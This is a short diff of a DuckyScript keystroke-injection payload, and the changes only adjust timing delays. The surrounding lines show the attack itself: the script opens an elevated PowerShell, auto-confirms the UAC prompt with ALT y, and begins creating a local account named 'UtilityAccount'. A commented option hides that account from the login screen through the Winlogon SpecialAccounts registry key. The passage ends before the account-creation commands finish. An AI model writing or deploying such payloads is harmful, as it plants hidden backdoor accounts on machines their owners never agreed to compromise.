@@ -13,13 +13,13 @@ REM Category: Execution
 REM Optional command (add at the end before exit): this hides the user from the control panel, lock screen, etc. but you might have trouble logging in physically
 REM reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v $Username /t REG_DWORD /d 0 /f
 
-DELAY 350
+DELAY 400
 GUI r
-DELAY 350
+DELAY 400
 STRINGLN powershell -Command "Start-Process PowerShell -Verb RunAs"  
-DELAY 650
+DELAY 1500
 ALT y
-DELAY 650
+DELAY 1500
 STRINGLN
                  PowerShell.exe -c ". mode.com con: lines=5 cols=20"
                  $Username = "UtilityAccount"
